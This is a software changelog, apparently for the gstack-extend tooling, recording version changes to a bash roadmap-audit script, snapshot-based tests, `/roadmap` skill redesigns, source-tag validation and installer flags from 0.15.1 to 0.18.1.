- **`STYLE_LINT` advisory: Pre-flight in single-Track Groups.** Encodes the new skill rule into `bin/roadmap-audit` so future restructures get caught at apply-time instead of relying on the prose getting read. New parser state `_GROUP_HAS_PREFLIGHT` (kv: "1=1 5=1") set when a Group's `**Pre-flight**` subsection is seen during `_parse_roadmap`. Check skips ✓ Complete Groups (historical structure, not actionable) and 0-Track Groups (already covered by STRUCTURE). Emits: "Group N: Pre-flight subsection in a single-Track Group is artificial separation — fold into Track NA". New snapshot fixture `tests/roadmap-audit/preflight-single-track/` covers positive (single-Track + Pre-flight → warn) and negative (multi-Track + Pre-flight → no warn) cases in one ROADMAP. Existing 14 fixtures unchanged (none used Pre-flight previously). 15 snapshot tests pass.
- **`docs/designs/bun-test-architecture.md`.** Captures the toolchain decision (bun + TypeScript, not Python), goal-state layout, four-phase migration, and risks. Drives the next chunk of execution work as Groups 1–4 in the roadmap (port `bin/roadmap-audit` from 3,495 lines of bash to compiled bun binary; migrate `scripts/test-*.sh` to `tests/*.test.ts` under `bun test --concurrent`; adopt gstack proper's leverage patterns — touchfiles diff selection, eval persistence + budget regression, LLM-as-judge, audit-compliance).

### Changed (roadmap restructure)
- **Active priority becomes Groups 1–4: bun + TypeScript test infrastructure.** Per the design doc, four sequential Groups (toolchain bootstrap → TS port of `bin/roadmap-audit` → test runner migration + invariants → leverage patterns). Existing install-pipeline and distribution work renumbered to Groups 5–6 (file collisions on `bin/roadmap-audit` would block them mid-port if they ran in parallel). 13 tasks total across 6 groups, 8 tracks. KILLs the "per-line bash loops perf" TODO (subsumed by Group 2's TS port).

## [0.18.1] - 2026-04-28

### Changed (test infrastructure)
- **`/ship` test phase: 5–7 minutes → ~50 seconds.** `scripts/test-roadmap-audit.sh` was a 4,554-line bash file with 436 hand-written grep assertions over `bin/roadmap-audit`. It dominated `/ship` runtime (~5–7 min just for that one suite). Replaced with a 124-line snapshot test runner and 14 fixture directories under `tests/roadmap-audit/`. Each fixture is `files/` (committed test inputs) + optional `args` (extra flags) + `expected.txt` (canonical audit stdout, path-normalized to `<TMPDIR>`). The runner cps fixtures into a tmp git repo, runs `bin/roadmap-audit`, and diffs against `expected.txt`. To accept intentional behavior changes: `UPDATE_SNAPSHOTS=1 ./scripts/test-roadmap-audit.sh`, then review the diff in `git diff tests/roadmap-audit/`.
- **Coverage gain, not loss.** Snapshots capture the full audit output (every section, every finding, every status), so any change to any check shows up as a snapshot diff in PR review. Hand-written grep assertions only covered what someone thought to assert. The old design fought the implementation — bash markdown parsing breaks on edge cases, so 436 assertions were the safety net. Snapshot diffs replace that net with a finer one.
- **Failure modes verified.** Drift is reported as a unified diff with a `run UPDATE_SNAPSHOTS=1 to accept` hint. Missing `expected.txt` reports a clear seed instruction. Both paths exit 1.

### Added
- `tests/roadmap-audit/` — 14 fixture directories covering empty repo, canonical good roadmap, vocab violations (state-machine parse, Phase whitelist, strikethrough exemption, case insensitivity), structure violations, size + collisions, scattered TODOs, doc-location, dependencies DAG, in-flight active work, closure-ready (✓ Complete), version staleness, todo-format validation, and `--scan-state` JSON output (with and without `--prompt`).
- `## [manual] Port bin/roadmap-audit out of bash` TODO in `docs/TODOS.md`. Audit is 3,495 lines of bash with ~272 command substitutions per run and a `git log -S` loop in the freshness scan; on this repo's own ROADMAP.md it takes ~70s. Subsumes the existing per-line bash-loop perf TODO. Now a pure binary-perf improvement (snapshot redesign already mitigated the test pain).

## [0.18.0] - 2026-04-28

### Changed (`/roadmap` reassessment redesign)
- **`/roadmap` is now plan reassessment, not inbox drainage.** The four-op precedence chain (REVISE → FRESHNESS → CLOSURE → TRIAGE) is replaced by a single LLM-owned reassessment step that holds the whole picture in mind and proposes a plan diff. v0.17.0 kept judgment in prose but the prose was structured per-op with narrow scope; per-item placement loops never zoomed out to ask "should this set of items reshape the structure?" Dogfood evidence: `/roadmap` on bolt dumped 11 inbox items into a 6-item Pre-flight serial chain mixing 3 distinct themes. Reassessment replaces that with: read everything, identify themes via qualitative judgment (cohesive scope? coherent files? bounded estimate? — no item-count rules), propose a plan diff covering structural changes + closures + placements, present in clusters via AskUserQuestion. The four ops become *kinds of changes the reassessment can propose*, not separate code paths. Greenfield is reassessment with an empty current plan. Closure debt (inbox items tagged `[pair-review:group=N]` or referencing in-flight Track files) blocks ✓ Complete in the same run — Real Done means resolving them first.
- **Hierarchical reassessment for large input.** When the LLM judges the input unwieldy (themes don't cluster on first read, draft proposal has internal contradictions), reassessment splits into Pass 1 Structure → Pass 2 Placement on the *full* picture (not Group-scoped — that loses cross-Group themes). LLM judges when to engage; no numeric threshold.
- **Adversarial-flagged items drive structural decisions.** `[full-review:severity=critical|necessary]` and `[investigate]` items aren't just exempt from batch deferral — they're a strong signal that closure debt exists or that an active Track's scope was wrong. Surface individually in the AskUserQuestion presentation and prioritize in structural/closure proposals.
- **Mid-flight Group reopening forbidden.** A ✓ Complete Group stays ✓ Complete. Hotfix is the only post-ship primitive. Stable IDs and PROGRESS history depend on this.

### Added
- **Structured proposal artifact** at `.context/roadmap/proposal-{ts}.md` — reassessment writes its diff proposal to a markdown file before AskUserQuestion. Three purposes: preview UX (user sees what will be applied), parseable test surface (dogfood fixtures grep section names + counts), audit trail (history of every reassessment in `.context/roadmap/`). Format prose-generated, not bash-emitted — judgment stays in prose.
- **Tightened fast-path predicate.** Fast-path now requires no in-flight Track has files with shipped activity since intro (`signals.git_inferred_freshness == 0`) — guards against the codex-flagged case where clean audit + empty inbox could rubber-stamp a stale plan.
- **Audit-after-apply backstop.** After Step 4 writes ROADMAP.md edits, the audit reruns; if any blocker fires (SIZE, COLLISIONS, STRUCTURE, VERSION, GROUP_DEPS, PARALLELISM_BUDGET), escalate per Escalation Protocol with the diff intact.
- **TODOS.md drain orphan check.** Pre-commit assertion that every item the proposal said to move/kill/defer is gone from `## Unprocessed`. Catches "applied wrong" failure mode.
- **Minimal-cue prompt parsing.** "just triage", "don't restructure", "small pass", "quick cleanup" and synonyms skip structural proposals but still surface closure debt and freshness — correctness can't be overridden by a minimal cue.
- **`scripts/test-skill-protocols.sh` ROADMAP_VERBATIM_BLOCKS.** Three new assertions (fast-path output, proposal artifact path, structural-cluster Hold-scope template) catch drift in load-bearing skill prose.

### Removed
- **`bin/roadmap-place`** deleted. Per-item ranking is no longer on the critical path; reassessment owns placement holistically. Tests removed (the eight roadmap-place test cases in `scripts/test-roadmap-audit.sh`). `roadmap-route` (KEEP/KILL/PROMPT pre-classification) is retained — that's pure mechanics.
- **`bin/roadmap-revise defer-task`** removed. Reassessment uses direct file edits for the trivial defer-to-Future case. `split-track` retained (genuinely complex helper logic worth keeping).

### Notes
- `bin/roadmap-audit` and `bin/roadmap-route` interfaces unchanged.
- Source-tag contract unchanged.
- Stable ID rules, vocabulary discipline, hotfix subsection mechanics, trust boundary on extracted strings — all preserved.

## [0.17.2] - 2026-04-28

### Changed (review-skill TODO framing — kill tunnel vision)

- **`/full-review` and `/pair-review` write TODOs in hedged language** so future implementers re-investigate before fixing instead of treating the original write as gospel. Two failure modes this addresses: (1) parked bugs from `/pair-review` get fixed weeks later from a one-line description ("the spinner is stuck") with no repro path, and the implementer fixes the written symptom rather than the actual bug; (2) `/full-review` reviewer agents emit speculative fixes that read as prescriptions, which then get applied verbatim — and because the agents naturally suggest additive fixes (new validation, new helpers, conformance), the codebase grows on every full review. Both are fixed at the writer side, where it's cheap; downstream `/roadmap` triage and the implementer don't need new behavior.
- **`/pair-review` park flow now captures `Symptom:` + numbered `Repro:` steps** when a bug is parked, with a graceful one-nudge fallback if the user can't reproduce reliably (records `Repro: not reliably reproducible — verify before fixing`). When the bug is promoted to TODOS.md, both fields plus a "re-verify before implementing a fix; if it no longer reproduces, close as resolved" line are written into the entry's Context. The `parked-bugs.md` schema switches `Description:` → `Symptom:` + `Repro:` to match. Triage AskUserQuestion templates in group-completion + Phase 2.5 updated to interpolate `[Bug title]` + the Symptom (the old `[description]` placeholder no longer resolved against the new schema).
- **`/full-review` reviewer-agent prompts gain "subtraction first" guidance** tailored to each agent's bias: the reviewer agent is told to prefer removing the violating caller over making the callee defend; the hygiene agent is told to delete duplicates before extracting helpers; the consistency-auditor is told to consider whether the deviating modules should be deleted before forcing them to conform. Each prompt also frames its output as a starting point for investigation, not a prescription.
- **Agent output field renamed `FIX:` → `HYPOTHESIS:`** in all three `/full-review` reviewer agents. TODOS write template renames `**Proposed fix:**` → `**Hypothesis (untested):**` with an explicit "re-investigate before implementing; the reviewer agent did not verify this direction" trailer. Renames `**Why:**` → `**Description:**` in the same template — "Why" reads as verified causation when read alongside the hedged hypothesis, while "Description" is tonally neutral and matches the agent's actual DESCRIPTION output field.

### Changed (source-tag contract)

- **`docs/source-tag-contract.md` registers `Symptom`, `Repro`, `Description`, and `Hypothesis (untested)`** as recommended attribute bullets, with per-source guidance: observation-source skills (`pair-review`, `investigate`) use `Symptom:` + `Repro:`; reviewer-source skills (`full-review`, `review`) use `Description:` + `Hypothesis (untested):`; manual / `/ship` entries continue to use `Why:`. New "Speculation framing" section documents the rationale (the framing is the fix; field-name parsing is unchanged). Legacy `Why:` and `Proposed fix:` field names remain valid on read since no parser inspects field names — the values pass through verbatim, so old TODOs.md content stays renderable. Examples and grammar updated to match.

### Tests

- All 7 test suites pass: 547+ assertions across `test-roadmap-audit` (216), `test-skill-protocols` (122), `test-test-plan` (61), `test-update` (59), `test-source-tag` (46), `test-test-plan-e2e` (43), and `test-test-plan-extractor`. Field-name renames touch only markdown writer templates and contract documentation; parsers and audit logic are unchanged so no test fixture updates were required.

## [0.17.1] - 2026-04-28

### Fixed
- **`bin/roadmap-audit` `_size_split_suggestion` malformed sed corrupted cluster state.** Line 2018 used `sed "s|${key}|${existing_count}|${key}|${new_count}|"` — `|` was both the `s` delimiter and embedded in the data, so sed parsed everything after the first `${existing_count}` as garbage flags and errored with `unknown option to 's'`. Under `set -euo pipefail` the failed command-substitution silently returned empty, blanking `clusters` on every duplicate-key hit. Effect: oversized tracks with multiple path clusters never emitted the `Split suggestion for NX:` line because `big_count` could never reach 2. The neighboring `grep -oE` lookup at line 2015 had a related fragility — regex metachars in path keys like `(misc)` would also misbehave. Both replaced with a single-pass shell loop using literal-string equality. Surfaced dogfooding `/roadmap` on bolt where Track 12A's 18 tasks always tripped the duplicate path. Regression test: `size: split suggestion fires across 2 path clusters`.

### Changed (FRESHNESS scope expansion)
- **`git_inferred_freshness` now relaxes the 2-commit floor to 1 when the commit message references the enclosing `Track NX`** (case-insensitive, dot in `7A.1`-style IDs escaped). The original 2-commit threshold filtered out the most common ship pattern: a whole Track landing in a single bundled PR shows as 1 commit on each touched file. Surfaced dogfooding `/roadmap` on bolt: Track 7A's bridge-hygiene sweep landed in commit `ceb1593` ("Track 7A bridge-hygiene sweep: dead code, dedupe, document focusBody") on `compose-editor.js`, but the freshness scan reported nothing because there was only one commit since intro. The Track-ID match is high-precision (commit messages that name a Track are almost always shipping that Track), so the false-positive guard isn't needed. Unannotated commits still need 2+ to fire. Updates `skills/roadmap.md` Op: FRESHNESS to enumerate both triggers.

### Added (in-place Track completion marker)
- **`### Track NX: Name ✓ Complete`** is now a recognized Track-completion path, symmetric with the long-standing `## Group N: Name ✓ Complete` Group convention. Parser populates a new `_COMPLETE_TRACKS` state; PARALLELISM_BUDGET (and PARALLELIZABLE_FUTURE), SIZE caps, COLLISIONS, and `max_tracks_per_group` all subtract completed Tracks from their counts and pairings. The collapse-to-italic FRESHNESS step is no longer the only completion path — it's now the *later* lifecycle stage (when the whole Group winds down). Surfaced dogfooding `/roadmap` on bolt: PARALLELISM_BUDGET reported 9 in-flight Tracks against a cap of 4, then suggested "collapse Tracks 12A/12B/12C/12D bodies" as the fix. That conflated a doc-hygiene op (FRESHNESS collapse) with a real concurrency-reduction op — completed Tracks aren't load, and forcing a doc edit before the budget can pass is the wrong remediation. Now: mark them ✓ Complete in place, audit reflects actual concurrency, and the LLM stops generating cosmetic-edit suggestions as budget fixes. PARALLELISM_BUDGET also emits a new `COMPLETE_TRACKS:` line so the exclusion is visible. The `bin/roadmap-audit:2751` advisory line gains a fourth remediation option ("marking shipped Tracks `✓ Complete` (in-place) so they stop counting"). Skill prose at `skills/roadmap.md:205` updated to enumerate both completion paths with guidance on when to use each.

### Tests
- 216 passing (was 209 → 210 with the SIZE regression test → 211 with two new `scan-state: 1 commit + Track-ID match` cases → 216 with five new `track ✓ complete` cases: max_tracks_per_group exclusion, IN_FLIGHT_TRACKS subtraction, COMPLETE_TRACKS line emission, SIZE-cap silent skip, COLLISIONS pairing skip).

## [0.17.0] - 2026-04-28

### Changed (signal-vs-verdict redesign)
- **`/roadmap` skill rewritten around the signal-vs-verdict boundary.** The 1390-line skill is now 510 lines. Helpers (`bin/roadmap-audit`, `bin/roadmap-place`, `bin/roadmap-route`, `bin/roadmap-revise`) emit raw signals only; skill prose composes ops and owns judgment. The previous design pulled too much decision logic into rigid bash — a rule-table emit fed prose that pretended to be neutral but was actually constrained by what the helper had already classified.
- **`bin/roadmap-audit --scan-state`** emits structured signal JSON (`unprocessed_count`, `in_flight_groups`, `origin_total`, `staleness_fail`, `git_inferred_freshness`, `has_zero_open_group` + intent flags). Skill prose composes the ops list (REVISE → FRESHNESS → CLOSURE → TRIAGE) using a 4-row markdown rule table that's visible, overrideable, and easy to change at runtime when the LLM has context the helper doesn't.
- **`bin/roadmap-place` rewritten to emit ranked candidates with a `needs_judgment` flag.** Three patterns: 1 candidate / unambiguous → use directly; 1 candidate / `needs_judgment=1` → sanity-check on-topic-ness; 2+ candidates → judgment-required (typically origin-shipped + non-critical). Prose decides via semantic file-overlap reading instead of literal string equality (the v0.16.x version couldn't see that `components/auth/LoginForm.tsx` overlaps `ui/auth/**`).
- **Track-ref regex made case-insensitive + normalized** in `--scan-state` intent parsing. "track 2a" now matches and emits `track_ref=2A`.

### Added (dogfood-driven framework fixes)
- **`route_source_tag` library function** in `bin/lib/source-tag.sh` — single source of truth for the source-default routing matrix (`KEEP|KILL|PROMPT`). `bin/roadmap-route` is now a thin CLI wrapper around it. Eliminates the previous duplication where the matrix lived in both `docs/source-tag-contract.md` (human-readable) and the helper's `case "$SOURCE" in` block (executable). Updates to either now propagate via the library.
- **`signals.git_inferred_freshness`** in `--scan-state` output — counts active ROADMAP.md tasks where 2+ commits landed on referenced files since the task was introduced. Catches the common "shipped without updating ROADMAP.md" case that the explicit `STALENESS` check missed (`STALENESS` only fires on items with explicit version-tag annotations). The dispatcher rules now OR `staleness_fail` with `git_inferred_freshness >= 1` to trigger the FRESHNESS op. The signal is intentionally a coarse trigger; the per-item user-confirmation gate filters precisely.
- **`[review]` registered as a source tag** for the `/review` skill (pre-landing adversarial review by Claude subagent + codex). Default: KEEP, like `full-review:necessary`. Optional `severity=critical|necessary|nice-to-have|edge-case` mirrors the `full-review` taxonomy. Documented in `docs/source-tag-contract.md`.

### Changed (skill prose convention clarifications)
- **Track-or-Pre-flight completion convention made explicit** in the FRESHNESS op. Pre-flight is structurally a Track-equivalent within a Group, so the same collapse rule applies: when every bullet is done, collapse to a single italic line under the Group heading. Individual task completion (one bullet within an active Track or Pre-flight, siblings still open): delete the bullet and update parent metadata; git log + CHANGELOG/PROGRESS.md preserve the history. The v0.16.x prose was silent on individual task handling, leaving the convention ambiguous.

### Fixed
- **`scripts/test-roadmap-audit.sh` test isolation flake.** The "size: loc cap blocks" assertion hard-coded `=300` but read from the user's `~/.gstack-extend/config`, so anyone with `roadmap_max_loc_per_track=800` saw the test fail. Tests now export `GSTACK_EXTEND_STATE_DIR` to an isolated tmp dir at script start, so user-level config can't bleed into fixtures.
- **Pre-flight 1 (`setup --skills-dir`) removed from ROADMAP.md** (shipped in v0.16.0). FRESHNESS scan proof point — the inferred-freshness signal correctly detected the shipped work; per-item review confirmed via git log inference.
- **`docs/designs/roadmap-revamp-smart-dispatcher.md` archived** to `docs/archive/` (v0.8.4 reference, current v0.17.0). ARCHIVE_CANDIDATES audit recommendation honored.

### Tests
- 376 passing total (was 327 at v0.16.2): 46/46 source-tag (was 37, +9 for `route_source_tag` matrix coverage and `[review]` parse), 208/208 audit (was 206, +2 for `git_inferred_freshness` fires/doesn't), 122/122 protocols.

## [0.16.2] - 2026-04-24

### Fixed (post-/review polish)
- **Cycle render duplicated the closing node** (`1A → 1B → 1B → 1A` instead of `1A → 1B → 1A`). Stack already ended at the current node; appending `${node}|→|${dep}|` repeated it. Cosmetic only — detection still fired — but the rendered string was misleading.
- **Same cycle reported under multiple rotations.** A 2-node cycle 1A↔1B emitted both `1A → 1B → 1A` and `1B → 1A → 1B` because DFS started from every root. New `_canonicalize_cycle` helper rotates the node list to lex-smallest-first before dedup, so all rotations of one cycle map to one canonical entry. Direction is preserved (3-node cycle 1A→1C→1B→1A stays 1A→1C→1B→1A, not the reverse).
- **Empty VERSION file emitted misleading diagnostic** (`No VERSION file or pyproject.toml version found` — the file exists). `read_current_version` now returns exit code 2 for the empty-file case; `check_version` emits a distinct `VERSION file exists but is empty` message with the recovery hint. No silent fallback to pyproject — the user clearly intended VERSION as the source, so misconfiguration must be visible.
- **`set -e` interaction**: callers of `read_current_version` use the `_ver_pair=$(...) || _rc=$?` idiom so a non-zero return doesn't abort the script under `set -euo pipefail`.

### Changed
- **Intra-group `Depends on: Track NX` is now the canonical serialization signal (full fix for #3 from the roadmap-skill feedback).** COLLISIONS skips any pair (A, B) where one Track transitively depends on the other; STYLE_LINT no longer warns on intra-group `Depends on:` (it's a valid DAG expression, not a structural bug). Authors can now write three `cli.py` Tracks with pair-wise `Depends on: Track 1A` / `Depends on: Track 1B` and have COLLISIONS accept it without needing a Group-level annotation. `_serialize: true_` survives as shorthand for "every Track depends on its predecessor in document order" — equivalent to writing `Depends on:` on each non-first Track, expanded into implicit edges at parse time. Replaces the v0.16.1 opt-in-only escape hatch with full DAG semantics.
- **VOCAB_LINT demoted from blocker (`STATUS: fail`) to advisory (`STATUS: warn`) — issue #5.** VOCAB_LINT is a style check, not a correctness check. Emitting `fail` made the skill treat style nitpicks as indistinguishable from real correctness bugs (missing docs, malformed headings, cycles), and CC rewrote prose to conform rather than overriding obvious false positives like "items cluster around X" (cluster-as-verb, not the nominal ban). Advisory findings can be overridden with a one-sentence rationale in the commit message or PR description — the run is `DONE_WITH_CONCERNS`, not `BLOCKED`. Severity-rollup in skills/roadmap.md updated: VOCAB_LINT moved from the blocker list to the advisory list.

### Added
- **`_TRACK_DEPS` parser state + transitive closure (`_track_depends_on`) + cycle detection (`_detect_track_dep_cycles`).** Intra-group `Depends on: Track NX` is stored as directed edges; `_serialize: true_` is expanded into implicit edges so downstream logic is annotation-agnostic. Cycles surface in `STYLE_LINT` (`Dep cycle in intra-Group track graph: 1A → 1B → 1A — remove or invert one edge to break the cycle`). DFS-based with a bounded visited set (max_tracks_per_group makes this cheap).
- **Advisory-override guidance in `skills/roadmap.md`.** New "Advisory vs blocking" block under "Interpreting audit findings" documents that `STATUS: warn` findings can be overridden with rationale (concrete example: cluster-as-verb false positive), not slavishly fixed. Closes the meta-issue behind #5 — the skill didn't clearly communicate that advisory checks are not hard gates.

### Tests
- `scripts/test-roadmap-audit.sh` grows 182 → 185 assertions. v0.16.1's `serialize-baseline` fixture (two tracks with `Depends on:` both on `cli.py`, asserted COLLISIONS fail) was semantically wrong under the new DAG rules — rewritten into a proper suite: `dag-no-deps-collides` (real collision, COLLISIONS fails), `dag-direct-dep` (intra-group Depends on auto-serializes), `dag-transitive` (A → B → C covers A-C pair), `dag-serialize-shorthand` (`_serialize: true_` still works), `dag-cycle` (cycle detection warns). The `style_lint: same-Group Depends on warns` test flipped to `style_lint: intra-Group Depends on is valid DAG (no warn)`. New `vocab_lint: violations emit advisory (warn), not fail` test locks in the severity demotion.

## [0.16.1] - 2026-04-24

### Fixed
- **Compact bold-form entries (`- **[tag] Title** — body`) silently ignored by `/roadmap`.** Both UNPROCESSED and TODO_FORMAT now count and flag the compact form. Near-miss: an 11-item inbox written in this shape would have reported "0 unprocessed" and exited with no action. Compact entries surface as `MALFORMED_HEADING: compact bold-form entry ... — rewrite as '### [tag] Title'` and drive `STATUS: found` on UNPROCESSED so the skill can't early-exit "empty".
- **STYLE_LINT rejecting `_Depends on:_` annotations with trailing prose.** `_Depends on: Group 5 (Auto-command) landing first before anything else_` is now accepted — the parser captures the leading `Group N (Name)` for identity + anchor and treats trailing clauses as commentary. Previously the audit dropped the annotation as "unparseable" and surfaced a false STYLE_LINT warning.

### Added
- **`pyproject.toml` as a version source.** For Python projects whose source of truth is `[project] version = "..."` (or `[tool.poetry] version`), the audit reads the version directly from `pyproject.toml` — no parallel VERSION file required. The VERSION section now emits a `SOURCE:` line (`VERSION` or `pyproject.toml`) and TAXONOMY stops flagging `VERSION: missing` when a pyproject version is present. VERSION file still wins when both exist. Helper: `read_current_version` emits `<version>|<source>` with consistent fallback across VERSION/TAXONOMY/ARCHIVE_CANDIDATES/STALENESS.
- **`_serialize: true_` Group-level escape hatch.** Cohesive batches of Tracks on a single monolithic file (e.g. three non-conflicting `cli.py` fixes from one debugging session) can annotate the Group header with `_serialize: true_` to opt into in-order Track execution. COLLISIONS skips pairwise overlap checks for serialized Groups (surfaced via `SERIALIZED_GROUPS:` so the skip is visible, not silent). STYLE_LINT permits intra-group `Depends on: Track NX` for serialized Groups (it IS the serialization signal). `max_tracks_per_group` cap still applies. Prevents the "split one cohesive batch into 5 → 6 → 7 single-Track chain to satisfy file-granular COLLISIONS" bureaucracy.

### Changed
- **`/roadmap` scrutiny gate: batched-triage mode for inboxes ≥ 7 items.** Single AskUserQuestion renders the full recommendation table (title, source, recommendation, provenance); options are "Approve all recommendations" / "I want to override some". Override path parses free-form syntax (`"3 keep, 7 kill, 9 defer"`). One-by-one remains the default for ≤ 6 items. Previously the 11-item triage session required 11 sequential modals for no added rigor.
- **`/roadmap` lightweight fast-path** when audit is clean + Unprocessed ≤ 3 + no closure debt + mode would be triage/update: skip rendering structural-assessment and closure-dashboard ceremony; emit a one-line summary and go straight to scrutiny + drain + commit.
- **`/roadmap` rule 3b** documents the `_serialize: true_` annotation alongside the existing intra-group Depends-on warning so the skill teaches the escape hatch rather than forcing a Group split.
- **`/roadmap` Step 3.5d**: preserve existing completion-style formatting conventions (inline `✅` markers, custom `## Shipped` sections, etc.). Surface a choice via AskUserQuestion before rewriting to canonical form instead of silently replacing.
- **`/roadmap` Step 2a**: adversarial-flagged items (Codex challenges, `[full-review:critical]`, `[full-review:necessary]`, `[investigate]` with incident trace) cannot be batch-deferred — they must surface individually for explicit KEEP/KILL/DEFER even in batched-triage mode.

### Tests
- `scripts/test-roadmap-audit.sh` grows from 170 to 182 assertions: compact-bullet form (3 tests — UNPROCESSED count, TODO_FORMAT flagging, mixed inbox accounting, fence awareness), pyproject version source (5 tests — read, precedence when both present, source-skip message, taxonomy gating), Depends on: trailing prose (2 tests — no unparseable warning, dep still resolves), `_serialize: true_` escape hatch (4 tests — baseline fail, annotated pass, intra-group Depends on: permitted, SERIALIZED_GROUPS surfaced).

## [0.16.0] - 2026-04-24

### Added
- **`setup --skills-dir <path>` flag.** Install skill symlinks into a custom directory instead of the default `~/.claude/skills/`. Enables per-project installs for users who want gstack-extend's skills scoped to a single project rather than globally. `setup --skills-dir ./project/.claude/skills` installs there; `setup --skills-dir ./project/.claude/skills --uninstall` removes from there. Flag order is flexible (`--uninstall --skills-dir` also works).
- **15 new test assertions in `scripts/test-update.sh`** (59 total, was 44): custom-dir install produces correct symlinks (2 asserts), defense-in-depth check that `--skills-dir` does NOT touch the default dir, `--skills-dir` with no value is rejected with non-zero exit (2 asserts), `--skills-dir <flag-like-value>` (e.g. `--skills-dir --uninstall`) is rejected cleanly, `--skills-dir` relative path is rejected, known-limitation warning fires on custom dir and NOT on default (2 asserts), `--skills-dir` + `--uninstall` cleans the custom dir (2 asserts) and removes ALL 5 skills (not just pair-review), reversed flag order works, and `--skills-dir` with a path containing spaces installs correctly (2 asserts).
- **Arg parsing hardening:** `--skills-dir` now rejects (a) missing values, (b) values starting with `-` (catches `setup --skills-dir --uninstall` and similar typos that would otherwise try `mkdir -p --uninstall` and fail noisily), and (c) relative paths (`./foo`, `bar/baz`) because they resolve against the invocation cwd and would make `setup --skills-dir` install-here / uninstall-elsewhere pairs silently diverge. Arg loop uses `while [ $# -gt 0 ]` so an empty-string `$1` doesn't short-circuit parsing. New tests lock these in under a mocked `$HOME` so a parse regression cannot touch the real `~/.claude/skills`.
- **Known-limitation warning.** When `--skills-dir` != default, `setup` prints a stderr warning explaining that skill preambles still hardcode `~/.claude/skills/{name}/SKILL.md` for helper resolution (v0.16.0 scope). The install itself succeeds; the warning tells users that `update-check`, `config`, and `audit` calls in the preambles will silently no-op until Pre-flight 2 lands. Prevents the "I installed but nothing works" silent-success surprise.
- **DRY cleanup in `setup`:** usage string extracted to a single `USAGE` constant, referenced from both error branches.

### Known limitation (addressed in Pre-flight 2, next PR)
Skill preambles still hardcode `readlink ~/.claude/skills/{name}/SKILL.md` to recover `$_EXTEND_ROOT`. Installs to a non-default `--skills-dir` path produce working symlinks but the preamble path-resolution silently fails (`_EXTEND_ROOT` empty, `$_EXTEND_ROOT/bin/...` calls no-op). Pre-flight 2 of Group 1 ships the probe-pattern fix. Until then, `--skills-dir` is the foundation but not the complete per-project install feature.

First PR of Group 1 Install Pipeline per `docs/ROADMAP.md`. Locked order: 1 (this PR) → 2 → Track 1A → 3 → 4.

## [0.15.2] - 2026-04-25

### Added
- **Drift-proof shared graft enforcement.** `scripts/test-skill-protocols.sh` now asserts that four cross-skill protocol fragments (Completion Status Protocol enum, Escalation opener, Escalation format, Confusion Protocol head) are byte-identical across all 5 skills. Edits become a deliberate two-step: change canonical text in the test script, watch tests fail, propagate to all 5. Test suite grows from 102 to 122 assertions. Drift detection verified via manual mutation against one skill.
- **`<!-- SHARED:<block-name> -->` HTML marker system.** 40 marker pairs (4 per skill × 5 skills) bracket the shared graft fragments. Invisible to LLMs reading the prose; explicit signal to humans maintaining shared content. Pre-stages the deferred `SKILL.md.tmpl` TODO for trivial mechanical extraction later.

### Changed
- **`/full-review`: removed redundant `## Error Handling` section** (-36 lines). All 8 sub-entries (agent timeout/failure, malformed agent output, missing TODOS.md, missing ROADMAP.md, session interrupted, empty results, git not available, clean working tree at commit) verified inline-covered in their respective Phases. Summary pointer section wasn't adding signal on sequential read.
- **`/review-apparatus`: removed redundant "Ambiguity rule" subsection.** It was a pointer to the Patterns section immediately below, which already covers the named patterns (Ask-why-on-ambiguity, Duplicate-TODOS handling, Skip-gap-when-no-cheap-answer) with specifics.
- **`/pair-review`: removed redundant State path restatements** in the Paths section (the intro paragraph already states the single source of truth); fixed a duplicate `---` separator before Error Handling.
- **`/roadmap`: removed redundant footer restatement of subcommand auto-detect behavior** (the first bullet of Subcommands already covers it).
- **`/test-plan`: fixed duplicate `groups/` heading** in the workspace-scoped state diagram (was visually confusing as two parallel directories).
- **`docs/TODOS.md`: rebalanced Codex host + Skill-file simplification TODOs** per `/plan-ceo-review` + `/plan-eng-review` decisions (2026-04-24). Codex-specific gates (description ≤ 1024 chars, env-var preamble pattern) moved back to the Codex host TODO where they belong. Simplification TODO codified scope discipline (only obvious dups), shared-fragment canonicalization strategy, execution order (Lane A serial then Lanes B-F parallel), and regression-surface trade explicitly accepted.

Scope discipline per /plan-eng-review: only literally duplicated content removed. Prose rewrites for style/concision on non-duplicated content, consolidation of distinct-but-similar sections, and cross-skill JSON contract consolidation explicitly deferred. Net change -11 lines; real value is the 20 new verbatim-block assertions that make future simplification and the deferred `SKILL.md.tmpl` work mechanical.

## [0.15.1] - 2026-04-24

### Added
- **Source-tag contract.** New `docs/source-tag-contract.md` defines the canonical schema for TODOS.md entries: `### [source:key=val] Title` heading + attribute child bullets. Source-default routing matrix, severity taxonomy, dedup semantics, and validator behavior all specified. Every producer skill references this doc; the audit validates against it.
- **`bin/lib/source-tag.sh`** — shared bash library with `parse_source_tag`, `normalize_title`, `compute_dedup_hash`, `validate_tag_expression`, `extract_tag_from_heading`, `extract_title_from_heading`. Pure string transforms, no side effects. Sourced by `bin/roadmap-audit`.
- **`## IN_FLIGHT_GROUPS` audit section.** Topo-sorts Groups against the DAG: Groups whose deps are all `✓ Complete` AND have at least one incomplete Track are in-flight. Emits the full list plus a PRIMARY (first by doc order — tiebreaker). Replaces the "first incomplete Group in doc order" approximation that was wrong on DAG roadmaps.
- **`## ORIGIN_STATS` audit section.** Per-Group counts of open origin-tagged items in `## Unprocessed` (`[pair-review:group=N,...]`, `[test-plan:group=N,...]`). Feeds the closure debt dashboard in `/roadmap` Step 1.
- **`## TODO_FORMAT` audit section.** Validates every Unprocessed entry against the source-tag contract. Emits `MALFORMED_HEADING` for legacy bullet entries, `UNKNOWN_SOURCE` for unregistered sources, `MALFORMED_TAG` for grammar violations, `INJECTION_ATTEMPT` for dangerous chars. `STATUS: fail` blocks triage.
- **Closure debt dashboard in `/roadmap` Step 1.** Top-of-output rendering of `IN_FLIGHT_GROUPS` + `ORIGIN_STATS` per in-flight Group. Makes deferred bug debt visible every run.
- **Auto-suggest closure walk.** When the dashboard shows 1+ open-origin items on an in-flight Group, `/roadmap` prompts "walk through these first?" before general triage. Integrated into the existing flow — not a subcommand.
- **Source-aware scrutiny gate in `/roadmap` Step 2a.** Now runs in triage/update modes too (previously overhaul-only). Per-source default recommendations drive keep/kill defaults: full-review:edge-case → SUGGEST KILL, full-review:nice-to-have → PROMPT, observed-bug sources → KEEP. Inverts CC's "add to backlog" reflex.
- **Closure bias in Step 3b/3c.** Origin-tagged items route back to the Group that surfaced them (`[pair-review:group=N]` → Group N). File-overlap heuristic is a secondary signal, not primary. Origin tag wins — writer's explicit statement of where the bug belongs.
